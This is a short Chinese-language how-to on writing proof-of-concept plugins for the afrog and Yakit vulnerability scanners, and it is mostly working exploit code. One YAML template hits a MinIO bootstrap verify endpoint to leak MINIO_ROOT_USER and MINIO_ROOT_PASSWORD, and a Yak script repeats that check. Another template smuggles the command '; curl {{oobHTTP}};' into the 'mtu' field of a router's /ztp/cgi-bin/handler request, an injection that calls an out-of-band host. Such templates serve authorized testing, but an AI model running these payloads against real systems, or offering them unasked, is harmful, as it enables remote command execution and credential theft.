## Afrog Poc开发

1、afrog -t https://xx.xx.xx.xx -P 1.yam

```
rules:
  r0:
    request:
      method: POST
      path: /minio/bootstrap/v1/verify
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'MINIO_ROOT_USER') &&
      response.body.bcontains(b'MINIO_ROOT_PASSWORD')
expression: r0()

2、afrog -t https://xx.xx.xx.xx -P 2.yaml
set:
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /ztp/cgi-bin/handler
      headers:
        Content-Type: application/json; charset=utf-8
      body: |
        {"command": "setWanPortSt","proto": "dhcp","port": "1270","vlan_tagged": "1270","vlanid": "1270","mtu": "; curl {{oobHTTP}};","data":""}
    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()

```

## Yakit Poc插件开发

1、基于Yaml语法

同Nuclei一致

2、基于Yak原语言

```
loglevel(`info`)
yakit.AutoInitYakit()

sendPacket = func(target) {
    return poc.HTTP(`POST /minio/bootstrap/v1/verify HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0`,
        poc.params({
            "target": target,
        }),
    )
}

target = cli.String("target")
if target == "" {
    die("no target")
}

result = "MINIO_ROOT_USER"

rsp, _, err = sendPacket(target)
die(err)

headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
if str.MatchAllOfSubString(body, result) {
    yakit.StatusCard("发现漏洞", target)
    log.info("find token: %v", result)
}

```